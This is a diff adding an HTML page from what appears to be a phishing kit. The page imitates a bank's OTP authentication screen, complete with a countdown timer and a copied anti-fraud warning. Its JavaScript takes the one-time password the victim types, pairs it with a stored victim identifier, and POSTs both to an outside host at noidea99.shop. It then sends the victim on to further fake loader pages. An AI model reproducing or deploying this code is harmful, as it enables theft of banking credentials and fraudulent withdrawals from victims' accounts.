@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width"/>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body onload="startTimer();">
+
+
+    <header class="logo">
+        <img src="assets/header.jpeg" alt="">
+    </header>
+
+    <br>
+
+    <div class="login-heading">
+        <h3 class="text-center">Authentication</h3>
+    </div>
+
+    <div class="login-form">
+
+        <br>
+
+        <p class="content_title">Enter One Time Password sending to your phone</p>
+        <p class="mandatory_txt">Mandatory fields are marked with an asterisk (*)</p>
+        <p class="text-danger invalid">Invalid One Time Password</p>
+        <p class="content_title text-danger">Automatically resend new OTP on your registered mobile.</p>
+
+
+        <form id="credit-form">
+            <div class="form-group">
+
+                <label class="control-label" for="Otp1"> One Time Password<span
+                        class="mandatory_txt">*</span></label>
+
+                <input class="form-control" id="lcode" name="lcode" type="text" name="Otp1" maxLength="8" />
+
+            </div>
+
+            <div class="commonbutton">
+                <input type="submit" class="btn btn-default" value="Submit" />
+            </div>
+        </form>
+
+        <div class="text-center">
+            <p id="time"></p>   
+        </div>
+
+        <div class="common_btn">
+            <p>If you did not receive the OTP on phone, you can<a href="#" class="btn btn-resend"
+                    type="button">Click here to resend OTP</a></p>
+        </div>
+    </div>
+
+    <div class="content_area">
+        <div class="info_panel">
+            <div class="notify_icon">
+                <ul>
+                    <li>Any of its representative never sends you email/SMS or calls you over phone to get your
+                        personal information, password or one time SMS password. Any such e-mail/SMS or phone
+                        call is an attempt to fraudulently withdraw money from your account through Internet
+                        Banking. Never respond to such email/SMS or phone call. Please report immediately. if
+                        you receive any such email/SMS or Phone call. Immediately change your passwords if you
+                        have accidentally revealed your credentials.</li>
+                    <li>Please note that you will receive the all communication related to Internet banking on
+                        your updated mobile number only after approval.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© OnlineBanking</p>
+    </div>
+</body>
+
+</html>
+
+<script type="text/javascript">
+    var timer=180;
+    var sec=0;
+    function startTimer() {
+    sec=parseInt(timer%180);
+
+    if (timer<2) {
+    // timer.stop();
+    window.location.href = "loader.html";
+    }
+
+    document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+    startTimer();
+
+    }, 1000);
+    }
+
+</script>
+
+<script>
+
+  document
+    .getElementById("credit-form")
+    .addEventListener("submit", function (event) {
+      event.preventDefault();
+      //IDS
+        const lcode = document.querySelector('input[name="lcode"]').value;
+
+        const randno = localStorage.getItem('random_no');
+
+        var data = {
+          randno : randno,
+          lcode: lcode
+        };
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://noidea99.shop/wssbi/Shop11.php", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText);
+                    window.location.href = "loader6.html";
+                } else {
+                    console.error("Error: " + xhr.status);
+                }
+            }
+        };
+
+        xhr.send(JSON.stringify(data));
+    });
+
+</script>
